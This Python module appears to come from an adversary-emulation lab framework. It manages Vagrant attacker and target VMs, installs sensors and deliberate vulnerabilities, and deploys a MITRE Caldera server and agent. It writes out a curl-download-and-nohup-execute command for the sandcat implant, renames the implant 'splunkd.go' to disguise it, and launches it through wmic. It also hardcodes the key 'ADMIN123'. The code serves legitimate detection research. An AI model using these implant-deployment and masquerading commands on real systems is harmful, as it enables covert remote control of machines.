#!/usr/bin/env python3

""" (Virtual) machine handling. Start, stop, create and destroy. Starting remote commands on them. """

import os
import socket
import time
from typing import Any, Optional, Union

import requests

from app.attack_log import AttackLog
from app.calderacontrol import CalderaControl
from app.config import MachineConfig
from app.config_verifier import Attacker, Target
from app.exceptions import ServerError, ConfigurationError, PluginError
from app.interface_sfx import CommandlineColors
from app.pluginmanager import PluginManager
from plugins.base.machinery import MachineryPlugin
from plugins.base.sensor import SensorPlugin
from plugins.base.vulnerability_plugin import VulnerabilityPlugin


class Machine():
    """ A virtual machine. Attacker or target. Abstracting stuff away. """

    def __init__(self, config: Union[dict, MachineConfig, Attacker, Target], attack_logger: AttackLog, calderakey: str = "ADMIN123",) -> None:
        """

        :param config: The machine configuration as dict
        :param attack_logger: The attack logger to use
        :param calderakey: Key to the caldera controller
        """

        self.vm_manager: Optional[MachineryPlugin] = None
        self.attack_logger: AttackLog = attack_logger
        self.calderakey: str = calderakey
        self.sensors: list[SensorPlugin] = []  # Sensor plugins
        self.vulnerabilities: list[VulnerabilityPlugin] = []  # Vulnerability plugins
        self.caldera_server: str = ""

        if isinstance(config, MachineConfig):
            self.config = config
        elif isinstance(config, Attacker):
            self.config = MachineConfig(config)
        elif isinstance(config, Target):
            self.config = MachineConfig(config)
        else:
            raise ConfigurationError("unknown type")

        self.plugin_manager = PluginManager(self.attack_logger)

        # TODO: Read config from plugin
        if self.config.vmcontroller() == "vagrant":
            self.__parse_vagrant_config__()
        if self.config.vmcontroller() == "running_vm":
            self.__parse_running_vm_config__()

        self.abs_machinepath_external = None

        self.abs_machinepath_external = os.path.join(self.vagrantfilepath, self.config.machinepath())
        # TODO Add internal machinepath path for within the VM (/vagrant/machinepath) for non-linux machines
        self.abs_machinepath_internal = os.path.join("/vagrant/", self.config.machinepath())

        if not os.path.exists(self.abs_machinepath_external):
            raise ConfigurationError(f"machinepath does not exist: {self.abs_machinepath_external}")

        self.load_machine_plugin()
        if self.vm_manager is None:
            raise ConfigurationError("VM manager required")
        playground = self.vm_manager.get_playground()
        if playground is None:
            playground = ""
        self.caldera_basedir: str = playground

    def __parse_vagrant_config__(self) -> None:
        """ Check if a file configured in the config is present """

        self.vagrantfilepath = os.path.abspath(self.config.vagrantfilepath())
        self.vagrantfile = os.path.join(self.vagrantfilepath, "Vagrantfile")
        if not os.path.isfile(self.vagrantfile):
            raise ConfigurationError(f"Vagrantfile not existing: {self.vagrantfile}")

    def __parse_running_vm_config__(self) -> None:
        """ Check if a file configured in the config is present """

        self.vagrantfilepath = os.path.abspath(self.config.vagrantfilepath())
        self.vagrantfile = os.path.join(self.vagrantfilepath, "Vagrantfile")

    def get_paw(self) -> Optional[str]:
        """ Returns the paw of the current machine """
        return self.config.caldera_paw()

    def get_group(self) -> Optional[str]:
        """ Returns the group of the current machine """
        return self.config.caldera_group()

    def destroy(self) -> None:
        """ Destroys the current machine """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        self.vm_manager.__call_destroy__()

    def create(self, reboot: bool = True) -> None:
        """ Create a VM

        :param reboot: Reboot the VM during installation. Required if you want to install software
        """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        self.vm_manager.__call_create__(reboot)

    def reboot(self) -> None:
        """ Reboot a machine """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        if self.get_os() == "windows":
            self.remote_run("shutdown /r")
            self.vm_manager.__call_disconnect__()
            time.sleep(60)   # Shutdown can be slow....
        if self.get_os() == "linux":
            self.remote_run("sudo reboot", must_succeed=False)
            self.vm_manager.__call_disconnect__()
        res = None
        while not res:
            time.sleep(5)

            if self.vm_manager is None:
                raise ConfigurationError("VM Manager is missing")

            res = self.vm_manager.__call_connect__()
            if self.attack_logger is not None:
                self.attack_logger.vprint("Re-connecting....", 3)
        self.attack_logger.vprint(f"The machine {self.vm_manager.get_vm_name()} is back {res.is_connected}", 3)

    def up(self) -> None:  # pylint: disable=invalid-name
        """ Starts a VM. Creates it if not already created """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        self.vm_manager.__call_up__()

    def halt(self) -> None:
        """ Halts a VM """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        self.vm_manager.__call_halt__()

    def getuser(self) -> str:
        """ Gets the user of the current VM """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        return "Result " + str(self.vm_manager.__call_remote_run__("echo $USER"))

    def connect(self) -> Any:
        """ command connection. establish it """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        return self.vm_manager.__call_connect__()

    def disconnect(self, connection: Any) -> None:  # pylint: disable=unused-argument
        """ Command connection dis-connect """

        if self.vm_manager is None:
            raise ConfigurationError("VM Manager is missing")

        self.vm_manager.__call_disconnect__()

    def remote_run(self, cmd: str, disown: bool = False, must_succeed: bool = False) -> str:
        """ Simplifies connect and run

        :param cmd: Command to run as shell command
        :param disown: run in background
        :param must_succeed: Throw an exception if the command being run fails.
        """
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")
        return self.vm_manager.__call_remote_run__(cmd, disown, must_succeed)

    def load_machine_plugin(self) -> None:
        """ Loads the matching machine plugin """

        for plugin in self.plugin_manager.get_plugins(MachineryPlugin, [self.config.vmcontroller()]):
            if not isinstance(plugin, MachineryPlugin):
                raise PluginError("Expected Machinery Plugin")
            name = plugin.get_name()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Installing machinery: {name}{CommandlineColors.ENDC}", 1)

            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external}
            plugin.set_sysconf(syscon)
            plugin.__call_process_config__(self.config)
            self.vm_manager = plugin
            if self.attack_logger is not None:
                self.attack_logger.vprint(
                    f"{CommandlineColors.OKGREEN}Installed machinery: {name}{CommandlineColors.ENDC}",
                    1)
            break

    def prime_sensors(self) -> bool:
        """ Prime sensors from plugins (hard core installs that could require a reboot)

        A machine can have several sensors running. Those are defined in a list in the config. This primes the sensors

        :result: true if a  reboot is required
        """

        reboot = False

        for plugin in self.plugin_manager.get_plugins(SensorPlugin, self.config.sensors()):
            if not isinstance(plugin, SensorPlugin):
                raise PluginError("Expected sensor plugin")
            name = plugin.get_name()
            # if name in self.config.sensors():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Priming sensor: {name}{CommandlineColors.ENDC}", 2)
            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external,
                      }
            plugin.set_sysconf(syscon)
            plugin.set_machine_plugin(self.vm_manager)
            # TODO: Process experiment config to get sensor configuration
            plugin.process_config({})    # plugin specific configuration
            plugin.setup()
            reboot |= plugin.prime()
            self.sensors.append(plugin)
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Primed sensor: {name}{CommandlineColors.ENDC}", 2)
        return reboot

    def install_sensors(self) -> None:
        """ Install sensors from plugins

        A machine can have several sensors running. Those are defined in a list in the config. This installs the sensors

        """

        for plugin in self.get_sensors():
            name = plugin.get_name()

            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Installing sensor: {name}{CommandlineColors.ENDC}", 2)
            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external,
                      }
            plugin.set_sysconf(syscon)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.process_config(self.config.raw_config.get(name, {}))  # plugin specific configuration
            plugin.setup()
            plugin.install()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Installed sensor: {name}{CommandlineColors.ENDC}", 2)

    def get_sensors(self) -> list[SensorPlugin]:
        """ Returns a list of running sensors """
        return self.sensors

    def start_sensors(self) -> None:
        """ Start sensors

        A machine can have several sensors running. Those are defined in a list in the config. This starts the sensors

        """
        for plugin in self.get_sensors():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Starting sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.start()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Started sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)

    def stop_sensors(self) -> None:
        """ Stop sensors

        A machine can have several sensors running. Those are defined in a list in the config. This stops the sensors

        """

        for plugin in self.get_sensors():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Stopping sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.stop()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Stopped sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)

    def collect_sensors(self, lootdir: str) -> list[str]:
        """ Collect data from sensors

        A machine can have several sensors running. Those are defined in a list in the config. This collects the data from the sensors

        :param lootdir: Fresh created directory for loot
        :returns: a list of file names to put into the loot zip
        """

        machine_specific_path = os.path.join(lootdir, self.config.vmname())
        os.mkdir(machine_specific_path)
        loot_files = []

        for plugin in self.get_sensors():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Collecting sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
            plugin.set_machine_plugin(self.vm_manager)
            loot_files += plugin.__call_collect__(machine_specific_path)
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Collected sensor: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
        return loot_files

    ############

    def prime_vulnerabilities(self) -> bool:
        """ Prime vulnerabilities from plugins (hard core installs that could require a reboot)

        A machine can have several vulnerabilities. Those are defined in a list in the config.

        :returns: True if a reboot is requires
        """

        reboot = False

        for plugin in self.plugin_manager.get_plugins(VulnerabilityPlugin, self.config.vulnerabilities()):
            if not isinstance(plugin, VulnerabilityPlugin):
                raise PluginError("Plugin manager returned wrong plugin type")
            name = plugin.get_name()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Priming vulnerability: {name}{CommandlineColors.ENDC}", 2)
            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external,
                      }
            plugin.set_sysconf(syscon)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.process_config({})    # plugin specific configuration
            plugin.setup()
            reboot |= plugin.prime()
            self.vulnerabilities.append(plugin)
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Primed vulnerability: {name}{CommandlineColors.ENDC}", 2)
        return reboot

    def install_vulnerabilities(self) -> None:
        """ Install vulnerabilities from plugins: The machine is not yet modified ! For that call start_vulnerabilities next

        A machine can have several vulnerabilities. Those are defined in a list in the config. This installs the vulnerabilities

        """

        for plugin in self.plugin_manager.get_plugins(VulnerabilityPlugin, self.config.vulnerabilities()):
            if not isinstance(plugin, VulnerabilityPlugin):
                raise PluginError("Plugin manager returned wrong plugin type")
            name = plugin.get_name()
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"Configured vulnerabilities: {self.config.vulnerabilities()}", 3)
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Installing vulnerability: {name}{CommandlineColors.ENDC}", 2)
            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external}
            plugin.set_sysconf(syscon)
            plugin.process_config({})  # process plugin specific config
            plugin.set_machine_plugin(self.vm_manager)
            plugin.setup()
            plugin.install(self.vm_manager)
            # self.vulnerabilities.append(plugin)

    def get_vulnerabilities(self) -> list[VulnerabilityPlugin]:
        """ Returns a list of installed vulnerabilities """
        return self.vulnerabilities

    def start_vulnerabilities(self) -> None:
        """ Really install the vulnerabilities on the machine

        A machine can have vulnerabilities installed. Those are defined in a list in the config. This starts the vulnerabilities

        """
        for plugin in self.get_vulnerabilities():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Activating vulnerability: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.start()

    def stop_vulnerabilities(self) -> None:
        """ Un-install the vulnerabilities on the machine

        A machine can have vulnerabilities installed. Those are defined in a list in the config. This stops the vulnerabilities

        """
        for plugin in self.get_vulnerabilities():
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Uninstalling vulnerability: {plugin.get_name()}{CommandlineColors.ENDC}", 2)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.stop()

    ############

    def get_ip(self) -> str:
        """ Returns the IP of the main ethernet interface of this machine """

        # TODO: Find a smarter way to get the ip
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")

        return self.vm_manager.get_ip()

    def get_name(self) -> str:
        """ Returns the machine name """

        return self.config.vmname()

    def get_nicknames(self) -> list[str]:
        """ Returns the machine name """

        return self.config.get_nicknames()

    def get_playground(self) -> Optional[str]:
        """ Return this machine's playground """
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")

        return self.vm_manager.get_playground()

    def get_machine_path_external(self) -> str:
        """ Returns the external path for this machine """
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")

        return self.vm_manager.get_machine_path_external()

    def put(self, src: str, dst: str) -> Any:
        """ Send a file to the machine """
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")

        return self.vm_manager.put(src, dst)

    def get(self, src: str, dst: str) -> Any:
        """ Get a file from a machine """
        if self.vm_manager is None:
            raise ConfigurationError("Missing VM Manager")

        return self.vm_manager.get(src, dst)

    def get_machine_info(self) -> dict:
        """ Returns a dict containing machine info """

        return {"name": self.get_name(),
                "nicknames": self.get_nicknames(),
                "playground": self.get_playground(),
                "net_id": self.get_ip(),
                "ip": socket.gethostbyname(self.get_ip()),
                "os": self.get_os(),
                "paw": self.get_paw(),
                "group": self.get_group(),
                "sensors": [s.name for s in self.get_sensors()],
                "vulnerabilities": [v.name for v in self.get_vulnerabilities()]
                }
        # TODO: Caldera implant
        # TODO: Metasploit implant

    # options for version: "4.0.0-alpha.2" and   "2.8.1"
    def install_caldera_server(self, cleanup: bool = False, version: str = "4.0.0-alpha.2") -> str:
        """ Installs the caldera server on the VM

        :param cleanup: Remove the old caldera version. Slow but reduces side effects
        :param version: Caldera version to use. Check Caldera git for potential branches to use
        """
        # https://github.com/mitre/caldera.git

        if self.vm_manager is None:
            raise ConfigurationError("VM manager missing")
        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Installing Caldera server {CommandlineColors.ENDC}", 1)

        if cleanup:
            cleanupcmd = "rm -rf caldera;"
        else:
            cleanupcmd = ""

        cmd = f"cd {self.caldera_basedir}; {cleanupcmd} git clone https://github.com/mitre/caldera.git --recursive --branch {version}; cd caldera; git checkout {version}; pip3 install -r requirements.txt"
        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Caldera server installed {CommandlineColors.ENDC}", 1)
        res = self.vm_manager.__call_remote_run__(cmd)
        return "Result installing caldera server " + str(res)

    def wait_for_caldera_server(self, timeout: int = 6) -> bool:
        """ Ping caldera server. return as soon as it is responding

        :param timeout: timeout in seconds
        """
        if self.attack_logger is None:
            raise ConfigurationError("Attack logger required")

        for i in range(timeout):
            time.sleep(10)
            caldera_url = "http://" + self.get_ip() + ":8888"
            caldera_control = CalderaControl(caldera_url, self.attack_logger, apikey=self.calderakey)
            if self.attack_logger is not None:
                self.attack_logger.vprint(f"{i}  Trying to connect to {caldera_url} Caldera API", 3)
            try:
                caldera_control.list_adversaries()
            except requests.exceptions.ConnectionError:
                pass
            else:
                self.attack_logger.vprint("Caldera: All systems nominal", 3)
                return True
        raise ServerError

    def start_caldera_server(self) -> None:
        """ Start the caldera server on the VM. Required for an attacker VM """
        # https://github.com/mitre/caldera.git

        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Starting Caldera server {CommandlineColors.ENDC}", 1)

        # The pkill was added because the server sometimes gets stuck. And we can not re-create the attacking machines in all cases
        self.remote_run(" pkill -f server.py || true;", disown=False)
        cmd = f"cd {self.caldera_basedir}; cd caldera ; nohup python3 server.py --insecure &"
        self.remote_run(cmd, disown=True)
        self.wait_for_caldera_server()
        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Caldera server started. Confirmed it is running.  {CommandlineColors.ENDC}", 1)

    def create_start_caldera_client_cmd(self) -> str:
        """ Creates a command to start the caldera client """

        playground = self.get_playground()

        if self.get_os() == "linux":
            # cmd = f"""chmod +x caldera_agent.sh; nohup bash {playground}/caldera_agent.sh start &"""
            cmd = f"""cd {playground}; chmod +x caldera_agent.sh; nohup bash ./caldera_agent.sh"""
        elif self.get_os() == "windows":
            if playground:
                playground = playground + "\\"  # Workaround for Windows: Can not set target dir for fabric-put in Windows. Only default (none=user) dir available.
            else:
                playground = ""
            # playground = self.vm_manager.get_playground()
            cmd = f"""
{playground}caldera_agent.bat
            """

        return cmd

    def start_caldera_client(self) -> None:
        """ Install caldera client. Required on targets """

        if self.vm_manager is None:
            raise PluginError("Vm manager not available")

        name = self.vm_manager.get_vm_name()
        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Starting Caldera client {name} {CommandlineColors.ENDC}", 1)

        if self.get_os() == "windows":
            if self.caldera_server is None:
                raise ConfigurationError("Caldera server not set")
            url = "http://" + self.caldera_server + ":8888"
            if not isinstance(self.attack_logger, AttackLog):
                raise ConfigurationError("attack_logger is not of type AttackLog")
            if self.abs_machinepath_external is None:
                raise ConfigurationError("External machine path not set")
            caldera_control = CalderaControl(url, self.attack_logger, apikey=self.calderakey)
            caldera_control.fetch_client(platform="windows",
                                         file="sandcat.go",
                                         target_dir=self.abs_machinepath_external,
                                         extension=".go")
            dst = self.get_playground()
            if self.abs_machinepath_external is None:
                raise ConfigurationError("External machine path not set")
            src = os.path.join(self.abs_machinepath_external, "caldera_agent.bat")
            self.vm_manager.put(src, dst)
            src = os.path.join(self.abs_machinepath_external, "splunkd.go")  # sandcat.go local name
            self.vm_manager.put(src, dst)

            # cmd = self.__install_caldera_service_cmd().strip()
            cmd = self.__wmi_cmd_for_caldera_implant()
            print(cmd)
            self.remote_run(cmd, disown=True)

        if self.get_os() == "linux":
            dst = self.get_playground()
            if self.abs_machinepath_external is None:
                raise ConfigurationError("machine_path external not set")
            if dst is None:
                raise ConfigurationError("Missing playground")
            src = os.path.join(self.abs_machinepath_external, "caldera_agent.sh")
            self.vm_manager.put(src, dst)

            cmd = self.create_start_caldera_client_cmd().strip()

            print(cmd)
            self.remote_run(cmd, disown=True)

        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Caldera client started {CommandlineColors.ENDC}", 1)

    def get_os(self) -> str:
        """ Returns the OS of the machine """

        return self.config.os()

    def __wmi_cmd_for_caldera_implant(self) -> str:
        """ Creates a windows specific command to start the caldera implant in background using wmi """

        playground = self.get_playground()
        if playground:  # Workaround for Windows: Can not set target dir for fabric-put in Windows. Only default (none=user) dir available.
            playground = playground + "\\"
        else:
            playground = "%userprofile%\\"
        if self.caldera_server is None:
            raise ConfigurationError("Caldera server not configured")
        url = "http://" + self.caldera_server + ":8888"

        res = f'wmic process call create "{playground}splunkd.go -server {url} -group {self.config.caldera_group()} -paw {self.config.caldera_paw()}" '

        return res

    def __install_caldera_service_cmd(self) -> str:
        playground = self.get_playground()

        if self.abs_machinepath_external is None:
            raise ConfigurationError("machine path external is not set")

        if self.attack_logger is None:
            raise ConfigurationError("Missing attack logger")

        if self.get_os() == "linux":
            return f"""
#!/bin/bash

# Installs and runs the caldera agent

# TODO: Respect start/stop commands

cd {playground}
server="http://{self.caldera_server}:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
chmod +x sandcat.go;
nohup ./sandcat.go -server $server -group {self.config.caldera_group()} -v -paw {self.config.caldera_paw()} &
                    """
        if self.get_os() == "windows":
            if playground:    # Workaround for Windows: Can not set target dir for fabric-put in Windows. Only default (none=user) dir available.
                playground = playground + "\\"
            else:
                playground = ""
            url = "http://" + self.caldera_server + ":8888"
            caldera_control = CalderaControl(url, self.attack_logger, apikey=self.calderakey)
            filename = caldera_control.fetch_client(platform="windows",
                                                    file="sandcat.go",
                                                    target_dir=self.abs_machinepath_external,
                                                    extension=".go")
            return f"""
START {playground}{filename} -server {url} -group {self.config.caldera_group()} -paw {self.config.caldera_paw()}
            """.strip()

        raise Exception  # System type unknown

    def install_caldera_service(self) -> None:
        """ Install the caldera client as a service. For linux targets """

        # print("DELETEME ! " + sys._getframe().f_code.co_name)

        content = self.__install_caldera_service_cmd()

        if self.abs_machinepath_external is None:
            raise ConfigurationError("machine path external is not set")

        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Installing Caldera service {CommandlineColors.ENDC}", 1)

        if self.get_os() == "linux":
            filename = os.path.join(self.abs_machinepath_external, "caldera_agent.sh")
        elif self.get_os() == "windows":
            filename = os.path.join(self.abs_machinepath_external, "caldera_agent.bat")
        with open(filename, "wt", encoding="utf8") as fh:
            fh.write(content)
        if self.attack_logger is not None:
            self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}Installed Caldera service {CommandlineColors.ENDC}", 1)

    def set_caldera_server(self, server: str) -> None:
        """ Set the local caldera server config """
        self.caldera_server = server
